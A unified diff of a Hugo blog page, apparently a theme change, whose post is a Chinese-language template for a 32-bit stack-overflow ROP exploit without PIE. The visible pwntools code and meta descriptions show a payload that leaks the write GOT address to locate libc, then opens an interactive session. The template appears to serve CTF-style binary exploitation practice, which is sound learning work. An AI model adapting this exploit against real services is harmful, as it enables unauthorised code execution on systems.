@@ -1,220 +1,98 @@
 <!DOCTYPE html>
-<html lang="en" itemscope itemtype="http://schema.org/WebPage">
-  <head>
+
+
+<html lang="en-us" data-theme="">
+<head>
+    
+        
+<meta charset="utf-8">
+<meta name="HandheldFriendly" content="True">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+<title>32位栈溢出rop模板 - Ssd&#39;s Blog</title>
+<meta name="description" content="">
+
+<link rel="icon" type="image/x-icon" href="https://shaodongshi.github.io/favicon.ico">
+<link rel="apple-touch-icon-precomposed" href="https://shaodongshi.github.io/favicon.png">
+
+
+
     
 
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
 
-  <title>32位栈溢出rop模板 - Ssd&#39;s Blog</title>
-  <meta name="description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) &#43; payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) &#43; p32(main_addr) &#43; p32(1) &#43; p32(write_got) &#43; p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc."><script type="application/ld+json">
-{
-    "@context": "http://schema.org",
-    "@type": "WebSite",
-    "name": "Ssd\u0027s Blog",
+
+
+
     
-    "url": "https:\/\/shaodongshi.github.io\/"
-}
-</script><script type="application/ld+json">
-{
-  "@context": "http://schema.org",
-  "@type": "Organization",
-  "name": "",
-  "url": "https:\/\/shaodongshi.github.io\/"
-  
-  
-  
-  
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "http://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [{
-        "@type": "ListItem",
-        "position": 1,
-        "item": {
-          "@id": "https:\/\/shaodongshi.github.io\/",
-          "name": "home"
-        }
-    },{
-        "@type": "ListItem",
-        "position": 3,
-        "item": {
-          "@id": "https:\/\/shaodongshi.github.io\/posts\/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie\/",
-          "name": "32位栈溢出rop模板"
-        }
-    }]
-}
-</script><script type="application/ld+json">
-{
-  "@context": "http://schema.org",
-  "@type": "Article",
-  "author": {
-    "name" : ""
-  },
-  "headline": "32位栈溢出rop模板",
-  "description" : "32位栈溢出rop模板（无PIE） #!usr\/bin\/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; process_name = \u0026#39;.\/\u0026#39; #p = process([process_name], env={\u0026#39;LD_LIBRARY_PATH\u0026#39;:\u0026#39;.\/\u0026#39;}) p = remote(\u0026#39;\u0026#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = \u0026#39;A\u0026#39;*(偏移) \u002b payload p.sendlineafter(\u0026#39;\u0026#39;, payload) main_addr = write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#34;write\u0026#34;] payload = p32(write_plt) \u002b p32(main_addr) \u002b p32(1) \u002b p32(write_got) \u002b p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(\u0026#34;write_addr =\u0026gt; %#x\u0026#34;, write_addr) libc = LibcSearcher(\u0026#39;write\u0026#39;, write_addr) libc_base = write_addr - libc.",
-  "inLanguage" : "en",
-  "wordCount":  145 ,
-  "datePublished" : "2021-07-11T17:26:35",
-  "dateModified" : "2021-07-11T17:26:35",
-  "image" : "https:\/\/shaodongshi.github.io\/",
-  "keywords" : [ "" ],
-  "mainEntityOfPage" : "https:\/\/shaodongshi.github.io\/posts\/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie\/",
-  "publisher" : {
-    "@type": "Organization",
-    "name" : "https:\/\/shaodongshi.github.io\/",
-    "logo" : {
-        "@type" : "ImageObject",
-        "url" : "https:\/\/shaodongshi.github.io\/",
-        "height" :  60 ,
-        "width" :  60
-    }
-  }
-}
-</script>
+    
+    
+
+    
+        <link rel="stylesheet" href="https://shaodongshi.github.io/css/style.3f46c97dc757486e9cd7d2da23b93d23933a9776d276af2336dc3cb567cc249e.css" integrity="sha256-P0bJfcdXSG6c19LaI7k9I5M6l3bSdq8jNtw8tWfMJJ4=">
+    
+
+
+
+
 
 <meta property="og:title" content="32位栈溢出rop模板" />
-<meta property="og:description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) &#43; payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) &#43; p32(main_addr) &#43; p32(1) &#43; p32(write_got) &#43; p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc.">
-<meta property="og:url" content="https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" />
-<meta property="og:type" content="website" />
-<meta property="og:site_name" content="Ssd&#39;s Blog" />
+<meta property="og:description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) &#43; payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) &#43; p32(main_addr) &#43; p32(1) &#43; p32(write_got) &#43; p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-11T17:26:35+08:00" />
+<meta property="article:modified_time" content="2021-07-11T17:26:35+08:00" />
 
-  <meta name="twitter:title" content="32位栈溢出rop模板" />
-  <meta name="twitter:description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], …">
-  <meta name="twitter:card" content="summary" />
-  <meta name="generator" content="Hugo 0.85.0" />
-  <link rel="alternate" href="https://shaodongshi.github.io/index.xml" type="application/rss+xml" title="Ssd&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://shaodongshi.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://shaodongshi.github.io/css/syntax.css" /><link rel="stylesheet" href="https://shaodongshi.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="32位栈溢出rop模板"/>
+<meta name="twitter:description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) &#43; payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) &#43; p32(main_addr) &#43; p32(1) &#43; p32(write_got) &#43; p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc."/>
 
 
 
-  </head>
-  <body>
-    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
-  <div class="container-fluid">
-    <div class="navbar-header">
-      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
-        <span class="sr-only">Toggle navigation</span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-      </button>
-      <a class="navbar-brand" href="https://shaodongshi.github.io/">Ssd&#39;s Blog</a>
-    </div>
 
-    <div class="collapse navbar-collapse" id="main-navbar">
-      <ul class="nav navbar-nav navbar-right">
-        
 
-        
 
-        
-      </ul>
-    </div>
 
-    
-
-  </div>
-</nav>
 
 
 
 
     
+</head>
+<body>
+    <a class="skip-main" href="#main">Skip to main content</a>
+    <div class="container">
+        <header class="common-header"> 
+            
+                <div class="header-top">
+    <h1 class="site-title">
+        <a href="/">Ssd&#39;s Blog</a>
+    </h1>
+    <ul class="social-icons">
 
 
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+</ul>
 
-<div class="pswp__bg"></div>
-
-<div class="pswp__scroll-wrap">
-    
-    <div class="pswp__container">
-      <div class="pswp__item"></div>
-      <div class="pswp__item"></div>
-      <div class="pswp__item"></div>
-    </div>
-    
-    <div class="pswp__ui pswp__ui--hidden">
-    <div class="pswp__top-bar">
-      
-      <div class="pswp__counter"></div>
-      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-      <button class="pswp__button pswp__button--share" title="Share"></button>
-      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-      
-      
-      <div class="pswp__preloader">
-        <div class="pswp__preloader__icn">
-          <div class="pswp__preloader__cut">
-            <div class="pswp__preloader__donut"></div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-      <div class="pswp__share-tooltip"></div>
-    </div>
-    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-    </button>
-    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-    </button>
-    <div class="pswp__caption">
-      <div class="pswp__caption__center"></div>
-    </div>
-    </div>
-    </div>
 </div>
 
-
-  
-  
-  
+    <nav></nav>
 
 
 
 
-
-
-  
-
-  <header class="header-section ">
+            
+        </header>
+        <main id="main" tabindex="-1"> 
+            
     
-    <div class="intro-header no-img">
-      <div class="container">
-        <div class="row">
-          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-            <div class="posts-heading">
-              
-                <h1>32位栈溢出rop模板</h1>
-              
-              
-                <hr class="small">
-              
-              
-              
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </header>
-
-
     
-<div class="container" role="main">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-      <article role="main" class="blog-post">
-        <h1 id="32位栈溢出rop模板无pie">32位栈溢出rop模板（无PIE）</h1>
+    <article class="post h-entry">
+        <header class="post-header">
+            <h1 class="p-name post-title">32位栈溢出rop模板</h1>
+        </header>
+        <div class="content e-content">
+            <h1 id="32位栈溢出rop模板无pie">32位栈溢出rop模板（无PIE）</h1>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!usr/bin/env python</span>
 <span style="color:#75715e">#coding=utf-8</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -265,83 +143,66 @@ send_payload(payload)
 <span style="color:#75715e">#****************************</span>
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div>
-
+        </div>
         
 
+
+<div class="post-info">
+    
+        <div class="post-date dt-published">2021-07-11</div>
+    
+    
+    <a class="post-hidden-url u-url" href="https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/">https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</a>
+    <a href=https://shaodongshi.github.io/ class="p-name p-author post-hidden-author h-card" rel="me"></a>
+
+
+    <div class="post-taxonomies">
         
-
-        
-      </article>
-
-      
-        <ul class="pager blog-pager">
-          
-            <li class="previous">
-              <a href="https://shaodongshi.github.io/posts/plt%E4%B8%8Egot/" data-toggle="tooltip" data-placement="top" title="Plt与got">&larr; Previous Post</a>
-            </li>
-          
-          
-            <li class="next">
-              <a href="https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" data-toggle="tooltip" data-placement="top" title="64位栈溢出rop模板(无PIE)">Next Post &rarr;</a>
-            </li>
-          
-        </ul>
-      
-
-
-      
-
+            
     </div>
-  </div>
 </div>
 
-      
-<footer>
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <ul class="list-inline text-center footer-links">
-          
-          
-        </ul>
-        <p class="credits copyright text-muted">
-          
-
-          &nbsp;&bull;&nbsp;&copy;
-          
-            2021
-          
-
-          
-            &nbsp;&bull;&nbsp;
-            <a href="https://shaodongshi.github.io/">Ssd&#39;s Blog</a>
-          
-        </p>
-        
-        <p class="credits theme-by text-muted">
-          <a href="https://gohugo.io">Hugo v0.85.0</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
-          
-        </p>
-      </div>
-    </div>
-  </div>
-</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
-<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
-
-<script src="https://shaodongshi.github.io/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://shaodongshi.github.io/js/load-photoswipe.js"></script>
-
-
-
-
-
-
-
-
+    </article>
 
     
-  </body>
-</html>
 
+    
+
+    
+
+
+        </main>
+        
+            <footer class="common-footer">
+    
+    
+
+    <div class="common-footer-bottom">
+        
+        <div class="copyright">
+            <p>© 2021<br>
+            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.<br>
+            
+            </p>  
+        </div> 
+
+        
+
+
+   
+    </div>
+
+    <p class="h-card vcard">
+
+    <a href=https://shaodongshi.github.io/ class="p-name u-url url fn" rel="me"></a> 
+
+    
+
+    
+</p> 
+</footer>
+
+        
+    </div>
+</body>
+</html>
